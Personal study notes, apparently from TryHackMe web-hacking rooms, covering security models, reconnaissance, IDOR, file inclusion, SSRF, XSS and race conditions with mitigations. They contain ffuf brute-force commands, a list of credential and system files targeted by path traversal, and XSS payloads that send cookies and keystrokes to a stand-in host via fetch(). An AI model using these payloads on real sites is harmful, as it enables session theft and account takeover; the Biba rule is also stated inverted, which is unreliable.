# Room 1
## Principles of Security 
Defense in Depth is the use of multiple varied layers of security for an organization's systems and data in the hopes that multiple layers will provide redundancy in an organization's security perimeter.

#### CIA 
![[CIA.png]]

#### Principles of Privilege 
The levels of access given to individuals are determined by two primary factors:

- The individual's role/function within the organization
- The sensitivity of the information being stored on the system

Two key concepts are used to assign and manage the access rights of individuals: Privileged Identity Management (PIM) and Privileged Access Management (PAM).

Initially, these two concepts can seem to overlap; however, they are different from one another. PIM is used to translate a user's role within an organization into an access role on a system. Whereas PAM is the management of the privileges a system's access role has, among other things.

#### Security Models
Security models are models to follow to achieve the CIA triad.

- **The Bell-La Padula Model**
	The Bell-La Padula Model is used to achieve confidentiality. This model has a few assumptions, such as an organization's hierarchical structure in which it is used, where everyone's responsibilities/roles are well-defined.
![[the-bell-lapadula.png]]

- **Biba Model**
	The Biba model is arguably the equivalent of the Bell-La Padula model but for the integrity of the CIA triad.
	This model applies the rule to objects (data) and subjects (users) that can be summarized as "no write up, no read down". This rule means that subjects **can** create or write content to objects at or below their level but **can only** read the contents of objects above the subject's level.

#### Threat Modeling 
Threat modeling is the process of reviewing, improving, and testing the security protocols in place in an organization's information technology infrastructure and services.

An effective threat model includes:
- Threat intelligence
- Asset identification
- Mitigation capabilities
- Risk assessment

# Web Hacking 
## Room 2
#### Dev Tools

## Room 3
#### Content Discovery
Content can be of different types [text, file, video, sound]. Content is not about the normal content that is visible in the browser but about data that is not immediately present to the user and that wasn't always intended for public access.

- **Manually**
	- **Robots.txt**: The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show in their search engine results or ban specific search engines from crawling the website altogether. 
		For example, if I have an administration portal on my website, I don't want it to be shown in the search engine results, so I include it in the robots.txt file.
	- **Favicon**: Sometimes we find websites that still have the favicon of the framework used, which allows us to identify the framework for further research.
	- **Sitemap.xml**: The opposite of robots.txt, this one lists all the files the website owner wants to be listed.  
	- **HTTP Headers**: Also provide some helpful information about the server and language.
- **Automated**
	- Wordlist 
	- ffuf, dirb, and gobuster.
- **OSINT**
	- **Google Hacking / Dorking**: A way of leveraging keywords to customize the search [inurl, intitle, filetype, site].
	- **Wappalyzer**: An online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors, and much more. It can even find version numbers as well.
	- **Wayback Machine**: An archive for websites since the 90s.
	- **GitHub**
	- **S3 Buckets**: Sometimes there are misconfigurations that allow unauthorized users to see files in buckets. URL format: `http(s)://{name}.s3.amazonaws.com`

# Room 4
#### Subdomain Enumeration
Subdomain enumeration is the process of finding valid subdomains to expand our attack surface. There are three ways to do so:

- **Brute Force** 
	- DNS brute force is trying tens, hundreds, thousands, or even millions of different possible subdomains from a predefined list.
- **OSINT**
	- **Certificate Authority (CA)**: When a certificate is created, the CA adds it to the Certificate Transparency log. This log helps keep track of domains and subdomains. This site provides a historical database for that: [https://crt.sh](https://crt.sh/) 
	- **Google Dorking**: Can help in looking for subdomains using custom queries like "site".
- **Virtual Host** 
	- We can utilize the host header to get the subdomains present by using a wordlist and looking for a valid subdomain from it using a tool like ffuf.

# Room 5
## Authentication Bypass

#### Wordlist 
ffuf - looking for valid usernames based on a wordlist and the error message when signing in with a present name:

```shell-session
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.38.35/customers/signup -mr "username already exists"
```

Attempting a brute force attack on the website with the username found in the previous action:
```shell-session
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.38.35/customers/login -fc 200
```

#### Logic Flaw 

#### Cookie Tampering

# Room 6
### IDOR
IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.  

This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents). Too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.

- It's like when I have a URL that shows something like user_id=1000. If I change the value to 1001 and I get access to the user with ID 1001, then that's an IDOR vulnerability.
- Sometimes we find that the URL is encoded. One way to exploit this is to decode it, find the variable, change it, encode it again, and send the request.
![[encode-decode.png]]
- The variables can also be hashed, which makes it difficult, but if the variable was only some sort of number, then you can reverse it.

# Room 7
### File Inclusion
File inclusion vulnerabilities occur when a web application allows user input to control which files are included or executed on the server, potentially allowing attackers to access unauthorized files or execute malicious code.
Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal.

##### Path Traversal
Path traversal occurs when the attacker abuses the get_file function and accesses files that are not meant to be visible, like `/etc/passwd`, using path traversal sequences like `../../`.

Here are some files that can be restricted for access:

| **Location** | **Description** |
|---|---|
| `/etc/issue` | Contains a message or system identification to be printed before the login prompt. |
| `/etc/profile` | Controls system-wide default variables, such as export variables, file creation mask (umask), terminal types, mail messages to indicate when new mail has arrived. |
| `/proc/version` | Specifies the version of the Linux kernel. |
| `/etc/passwd` | Has all registered users that have access to a system. |
| `/etc/shadow` | Contains information about the system's users' passwords. |
| `/root/.bash_history` | Contains the history commands for the `root` user. |
| `/var/log/dmessage` | Contains global system messages, including the messages that are logged during system startup. |
| `/var/mail/root` | All emails for the `root` user. |
| `/root/.ssh/id_rsa` | Private SSH keys for a root or any known valid user on the server. |
| `/var/log/apache2/access.log` | The accessed requests for the `Apache` web server. |
| `C:\boot.ini` | Contains the boot options for computers with BIOS firmware. |

##### Local File Inclusion (LFI)
LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. In this room, we'll be focusing on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.

To fix the problem of file inclusion when using include and similar functions, the developer can specify what directory the include function can accept.
For example, like this:
```php
include(languages/THM.php);
```
Here the include function accepts only files in the languages folder, and also we can see that it accepts only files with the extension of .php.

##### Remote File Inclusion
Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into an include function. One requirement for RFI is that the allow_url_fopen option needs to be on.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

![[file-inclusion4.png]]

As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent file inclusion vulnerabilities, some common suggestions include:

1. Keep systems and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen and allow_url_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are needed.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.

# Room 8
### Introduction to SSRF
SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the web server to make an additional or edited HTTP request to the resource of the attacker's choosing.

There are two types of SSRF:
- The result of the request is shown on the attacker's screen
- Blind SSRF - no info is returned to the page

A successful SSRF attack can result in any of the following: 

- Access to unauthorized areas
- Access to customer/organizational data
- Ability to scale to internal networks
- Reveal authentication tokens/credentials

SSRF examples:
![[file-inclusion3.png]]
![[file-inclusion2.png]]
![[path-traversal4.png]]
![[file-inclusion.png]]

How to spot SSRF vulnerability:
- When a full URL is in the address bar ![[path-traversal3.png]]
- **A hidden field in a form**
- **A partial URL such as just the hostname:** ![[path-traversal2.png]]
- **Or perhaps only the path of the URL:** ![[path-traversal.png]]

There are two main approaches to this:
- Allow list 
- Deny list 
- Open redirect 

# Room 9
## Introduction to Cross-site Scripting
In XSS, the payload is the JavaScript code we wish to be executed on the target's computer. There are two parts to the payload: the intention and the modification.

The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:
`<script>alert('XSS');</script>`

**Session Stealing:**
Details of a user's session, such as login tokens, are often kept in cookies on the target's machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission, and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged in as that user.
`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  

**Key Logger:**
The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`

**Business Logic:**
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:
`<script>user.changeEmail('attacker@hacker.thm');</script>`

#### XSS Vulnerability
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.
![[XSS.png]]

#### **Stored XSS**
As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

**Example Scenario:**  
A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

#### **DOM Based XSS**
DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

#### **Blind XSS**
Blind XSS is similar to stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

**For getting cookies:** `btoa(document.cookie);</script>`
`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie));</script>`

Let's break down the payload:

- The `</textarea>` tag closes the text area field.
- The `<script>` tag opens an area for us to write JavaScript.
- The `fetch()` command makes an HTTP request.
- `URL_OR_IP` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
- `PORT_NUMBER` is the port number you are using to listen for connections on the AttackBox.
- `?cookie=` is the query string containing the victim's cookies.
- `btoa()` command base64 encodes the victim's cookies.
- `document.cookie` accesses the victim's cookies for the Acme IT Support Website.
- `</script>` closes the JavaScript code block.

# Room 10 
## Race Condition 
A race condition is a situation in computer programs where the timing of events influences the behavior and outcome of the program. It typically happens when a variable gets accessed and modified by multiple threads. Due to a lack of proper lock mechanisms and synchronization between the different threads, an attacker might abuse the system and apply a discount multiple times or make money transactions beyond their balance.

#### Multi-Threading 
Process state:
![[process-phase.png]]

Time-of-Check to Time-of-Use (TOCTOU) vulnerability:
This kind of vulnerability happens when, say, we have two threads working on the same process, for example a withdrawal from an account:
- First thread withdraws $50 from a balance of $100
- The second thread (starts before the first thread updates the account) withdraws $90 from a balance of $100 

So now we have a conflict.

Some of the causes of race conditions:
- **Parallel Execution**: Web servers may execute multiple requests in parallel to handle concurrent user interactions. If these requests access and modify shared resources or application states without proper synchronization, it can lead to race conditions and unexpected behavior.
- **Database Operations**: Concurrent database operations, such as read-modify-write sequences, can introduce race conditions. For example, two users attempting to update the same record simultaneously may result in inconsistent data or conflicts. The solution lies in enforcing proper locking mechanisms and transaction isolation.
- **Third-Party Libraries and Services**: Nowadays, web applications often integrate with third-party libraries, APIs, and other services. If these external components are not designed to handle concurrent access properly, race conditions may occur when multiple requests or operations interact with them simultaneously.

TO BE CONTINUED

## Detection

Detecting race conditions from the business owner's perspective can be challenging. If a few users redeemed the same gift card multiple times, it would most likely go unnoticed unless the logs are actively checked for certain behaviors. Considering that race conditions can be used to exploit even more subtle vulnerabilities, it is clear that we need the help of penetration testers and bug bounty hunters to try to discover such vulnerabilities and report their findings.

Penetration testers must understand how the system behaves under normal conditions when enforced controls are in place. The controls can be: use once, vote once, rate once, limit to balance, and limit to one every 5 minutes, among others. The next step would be to try to circumvent this limit by exploiting race conditions. Figuring out the different system's states can help us make educated guesses about time windows where a race condition can be exploited. Tools such as Burp Suite Repeater can be a great starting point.

## Mitigation

We will list a few mitigation techniques:

- **Synchronization Mechanisms**: Modern programming languages provide synchronization mechanisms like locks. Only one thread can acquire the lock at a time, preventing others from accessing the shared resource until it's released.
- **Atomic Operations**: Atomic operations refer to indivisible execution units, a set of instructions grouped together and executed without interruption. This approach guarantees that an operation can finish without being interrupted by another thread.
- **Database Transactions**: Transactions group multiple database operations into one unit. Consequently, all operations within the transaction either succeed as a group or fail as a group. This approach ensures data consistency and prevents race conditions from multiple processes modifying the database concurrently.